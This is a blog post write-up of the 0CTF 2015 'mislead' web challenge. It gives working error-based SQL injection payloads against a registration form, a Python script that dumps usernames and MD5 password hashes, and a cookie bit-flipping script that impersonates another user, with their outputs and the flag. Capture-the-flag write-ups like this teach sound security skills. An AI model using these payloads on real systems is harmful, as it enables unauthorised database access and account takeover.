

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>0CTF 2015 - mislead (web 300)</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="../../../../../assets/favicon.png?v=d47df0f104">

    <link rel="stylesheet" type="text/css" href="../../../../../assets/css/screen.css?v=d47df0f104">
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">

    <script type="text/javascript" src="../../../../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/moment.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/handlebars.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
    <script type="text/javascript" src="../../../../../assets/js/index.js?v=d47df0f104"></script>


    <link rel="canonical" href="http://www.pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="http://www.pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/amp/">
    
    <meta property="og:site_name" content="&lt;/pwntester&gt;">
    <meta property="og:type" content="article">
    <meta property="og:title" content="0CTF 2015 - mislead (web 300)">
    <meta property="og:description" content="We are welcomed with a login page where we can register a new account and log in with it.  After logging to the application we received a:   Hello pwntester. Try to login as 0ops!   The first thing I looked for was for SQL injection in the register and login forms.">
    <meta property="og:url" content="http://www.pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/">
    <meta property="article:published_time" content="2015-03-30T21:41:46.000Z">
    <meta property="article:modified_time" content="2015-03-30T22:15:14.000Z">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="0CTF 2015 - mislead (web 300)">
    <meta name="twitter:description" content="We are welcomed with a login page where we can register a new account and log in with it.  After logging to the application we received a:   Hello pwntester. Try to login as 0ops!   The first thing I looked for was for SQL injection in the register and login forms.">
    <meta name="twitter:url" content="http://www.pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="pwntester">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "&lt;/pwntester&gt;",
        "logo": "http://www.pwntester.com/content/images/2014/May/rooted.jpeg"
    },
    "author": {
        "@type": "Person",
        "name": "pwntester",
        "image": {
            "@type": "ImageObject",
            "url": "//www.gravatar.com/avatar/d195407e71e25241001971f9fa5cca45?d=404",
            "width": 80,
            "height": 80
        },
        "url": "http://www.pwntester.com/author/pwntester/",
        "sameAs": []
    },
    "headline": "0CTF 2015 - mislead (web 300)",
    "url": "http://www.pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/",
    "datePublished": "2015-03-30T21:41:46.000Z",
    "dateModified": "2015-03-30T22:15:14.000Z",
    "description": "We are welcomed with a login page where we can register a new account and log in with it.  After logging to the application we received a:   Hello pwntester. Try to login as 0ops!   The first thing I looked for was for SQL injection in the register and login forms.",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://www.pwntester.com"
    }
}
    </script>

    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">

    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../../../../assets/css/prism.css?v=d47df0f104">

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49973078-2', 'pwntester.com');
  ga('send', 'pageview');

</script></head>

<body class="post-template">

    <div id="sidebar">
        <div id="sidebar-content" class="inner">
            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../../../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
            <h3 class="blog-description"></h3></h2>

            <!--form id="search">
                <input id="search-field" placeholder="Search"/>
            </form-->
            <form id="search">  
                <input id="search-field" type="search" placeholder="Search">
            </form>  

            <div id="sidebar-links">
                <ul id="subscription-links">
                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
                    <!-- No support yet
                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
                    -->
                </ul>
                <ul id="sidebar-internal">
                    <!-- For 'About' and other pages -->
                </ul>
                <ul id="sidebar-external">
                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
                </ul>
            </div>

            <footer class="site-footer">
                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
            </footer>
        </div>
    </div>

    <main>
        <section id="results"></section>
        

<article class="post">


        <span class="post-meta"><time datetime="2015-03-30">30 Mar 2015</time> </span>

        <h1 class="post-title">0CTF 2015 - mislead (web 300)</h1>

        <section class="post-content">
            <p>We are welcomed with a login page where we can register a new account and log in with it. <br>
After logging to the application we received a:  </p>

<pre><code class="language-lang-raw">Hello pwntester. Try to login as 0ops!  
</code></pre>

<p>The first thing I looked for was for SQL injection in the register and login forms. The register one turned to be injectable and we can use Duplicate entry technique to dump the DB:</p>

<p>Get the DB:  </p>

<pre><code class="language-lang-raw">username=pwner10&amp;password='),(select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) );#&amp;submit=Submit  
</code></pre>

<p>Output:  </p>

<pre><code class="language-lang-raw">SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'mislead1' for key 'group_key'&lt;br&gt;maybe another username?  
</code></pre>

<p>Get the tables:  </p>

<pre><code class="language-lang-raw">username=pwner10&amp;password='),(select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  
 );#&amp;submit=Submit
</code></pre>

<p>Output:  </p>

<pre><code class="language-lang-raw">SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'users~1' for key 'group_key'&lt;br&gt;maybe another username?  
</code></pre>

<p>Get the columns:  </p>

<pre><code class="language-lang-raw">username=pwner10&amp;password='),(select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  );#&amp;submit=Submit  
</code></pre>

<p>Output:  </p>

<pre><code class="language-lang-raw">SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'id~1' for key 'group_key'&lt;br&gt;maybe another username?

SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'username~1' for key 'group_key'&lt;br&gt;maybe another username?

SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'password~1' for key 'group_key'&lt;br&gt;maybe another username?  
</code></pre>

<p>Get the first user:  </p>

<pre><code class="language-lang-raw"> username=pwner10&amp;password='),(select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x7e,password) as char),0x7e)) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)   );#&amp;submit=Submit
</code></pre>

<p>Output:  </p>

<pre><code class="language-lang-raw">SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '0ops~13096de41fe9a97b700d4d9e21665484~1' for key 'group_key'&lt;br&gt;maybe another username?  
</code></pre>

<p>YAY! We have the <code>MD5</code> for 0ops's password, we crack it, log in as 0ops and get our flag, easy, isnt it? Well, nope. MD5 is not in any hash DB, so we are back where we started.</p>

<p>One thing stands out when looking at the request:  </p>

<pre><code class="language-lang-raw">GET /mislead/index.php HTTP/1.1  
Host: 202.112.26.101  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/20100101 Firefox/36.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,es-ES;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Cookie: auth=YWVkMTM0MjNjYWZkY2IyMDgxODExNDcwM2E1ODY2NWZhYTAzMzY3ZjQ1ZjFjMjQxNmQxNjRjNGM1ZGM0ZDEwZA%3D%3D  
Referer: http://202.112.26.101/mislead/login.php  
Connection: keep-alive  
</code></pre>

<p>Its a php application but its not using PHPSESSIONs but a custom <code>Auth</code>instead. This cookie is encoded in <code>base64</code> and then encoded in <code>hexadecimal</code>. But there is no useful info for us. We can assume that the cookie keeps the application state including the user associated to the session.</p>

<p>At this point, we decide to flip bits in the cookie to see if some changes/break and at some byte(14), the logging message changes and our names is modified. Cool! So we can try to bit-flip the cookie and get the username to be 0ops. For that, the easiest way is to register a name very similar (just one letter off) and bit-flip that byte until we get the right name.</p>

<p>All the usernames I tried were already picked so I started to think that someone register all those users once they got the flag (sign that we are in the right direction). I used the useless SQLi to pwn the pwners:</p>

<pre><code class="language-lang-python line-numbers">import requests  
url = 'http://202.112.26.101//mislead/register.php'  
for i in xrange(4000):  
    data = {
        'username': 'pwntester',
        'password': "'),(select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x7e,password) as char),0x7e)) from users limit %d,1),floor(rand(0)*2))x from information_schema.tables group by x)a));#" % i,
        'submit': 'Submit',
    }
    res = requests.post(url, data=data)
    if "ops~" in res.text:
        print res.text
</code></pre>

<p>We get:  </p>

<pre><code class="language-lang-raw">~/CTFs/tasks/0CTF2k15/mislead&gt; python pwn.py
SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '0ops~13096de41fe9a97b700d4d9e21665484~1' for key 'group_key'&lt;br&gt;maybe another username?  
SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ' 0ops~698d51a19d8a121ce581499d7b701668~1' for key 'group_key'&lt;br&gt;maybe another username?  
SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'Oops~c8837b23ff8aaa8a2dde915473ce0991~1' for key 'group_key'&lt;br&gt;maybe another username?  
</code></pre>

<p>Ok, I will use <code>Oops</code> (Capital O) if md5 is easy to crack which it is <code>123321</code></p>

<p>Now, log with this user and get the cookie:  </p>

<pre><code class="language-lang-raw">YWVkMTM0MjNjYWZkY2IyMDgxODExNDcwM2E1ODY2NWZhYTAzMzY3ZjQ1ZjFjMjQxNmQxNjRjNGM1ZGM0ZDEwZA==  
</code></pre>

<p>Using the following script, we can get the flag:  </p>

<pre><code class="language-lang-python line-numbers">import requests  
from base64 import b64decode, b64encode  
from hexdump import hexdump  
import sys  
import string

url = 'http://202.112.26.101//mislead/index.php'  
OopsCookie = 'YWVkMTM0MjNjYWZkY2IyMDgxODExNDcwM2E1ODY2NWZhYTAzMzY3ZjQ1ZjFjMjQxNmQxNjRjNGM1ZGM0ZDEwZA=='  
binCookie = b64decode(OopsCookie).decode("hex")  
bytelength = len(binCookie)

def is_printable(s):  
    for ch in s:
        if not ch in string.printable:
            return False
    return True

def flip_byte(msg, pos, byte=0x10):  
    msg = msg[:pos] + chr(ord(msg[pos]) ^ byte) + msg[pos+1:]
    return msg

for i in xrange(bytelength):  
    res = requests.get(url, cookies={'auth': b64encode(flip_byte(binCookie, i).encode("hex"))})
    print i, res.text
    if "Hello" in res.text and "Oops" not in res.text:
        for c in xrange(256):
            res = requests.get(url, cookies={'auth': b64encode(flip_byte(binCookie, i, c).encode("hex"))})
            if is_printable(res.text):
                print i, c, res.text
</code></pre>

<p>Output is:  </p>

<pre><code class="language-lang-raw">14 112 Hello ?ops. Try to login as 0ops!  
14 113 Hello &gt;ops. Try to login as 0ops!  
14 114 Hello =ops. Try to login as 0ops!  
14 115 Hello &lt;ops. Try to login as 0ops!  
14 116 Hello ;ops. Try to login as 0ops!  
14 117 Hello :ops. Try to login as 0ops!  
14 118 Hello 9ops. Try to login as 0ops!  
14 119 Hello 8ops. Try to login as 0ops!  
14 120 Hello 7ops. Try to login as 0ops!  
14 121 Hello 6ops. Try to login as 0ops!  
14 122 Hello 5ops. Try to login as 0ops!  
14 123 Hello 4ops. Try to login as 0ops!  
14 124 Hello 3ops. Try to login as 0ops!  
14 125 Hello 2ops. Try to login as 0ops!  
14 126 Hello 1ops. Try to login as 0ops!  
14 127 Welcome to the 0ops secret place!&lt;br&gt;Just get your flag here :)&lt;br&gt;0ctf{w3_musT_kn0w_S0Me_crYpt0gr4phY}  
</code></pre>

<p>FLAG is: <code>0ctf{w3_musT_kn0w_S0Me_crYpt0gr4phY}</code></p>
        </section>

        <footer class="post-footer">

            <section class="author">
                <div class="author-image">
                     <img src="http://www.gravatar.com/avatar/d195407e71e25241001971f9fa5cca45?d=404" alt="pwntester"> 
                </div>
                <div class="author-text">
                    <h4>pwntester</h4>
                    <p></p>
                    <div class="author-meta clearfix">
                        
                        
                    </div>
                </div>
            </section>

            <section class="share">
                <h4>Share this post</h4>
                <div class="share-icons">
                    <a class="fa fa-twitter-square" href="https://twitter.com/share?text=0CTF%202015%20-%20mislead%20(web%20300)&amp;url=http://www.pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                        <span class="hidden">Twitter</span>
                    </a>
                    <a class="fa fa-facebook-square" href="https://www.facebook.com/sharer/sharer.php?u=http://www.pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
                        <span class="hidden">Facebook</span>
                    </a>
                    <a class="fa fa-google-plus-square" href="https://plus.google.com/share?url=http://www.pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
                        <span class="hidden">Google+</span>
                    </a>
                </div>
            </section>

        </footer>

        <section class="post-comments">
            <div id="disqus_thread"></div>
            <script type="text/javascript">
                /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
                var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
                /* * * DON'T EDIT BELOW THIS LINE * * */
                (function() {
                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
                })();
            </script>
            <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
            <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
        </section>


</article>
    </main>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

    <script src="../../../../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
    <script data-no-instant>InstantClick.init();</script>
    <script data-no-instant>
        InstantClick.on('change', function() {
            prism_markdown();
            Prism.highlightAll();
        });
        InstantClick.init();
    </script>

    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>

    <script type="text/javascript" src="../../../../../assets/js/prism-loader.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/prism.js?v=d47df0f104"></script>

</body>

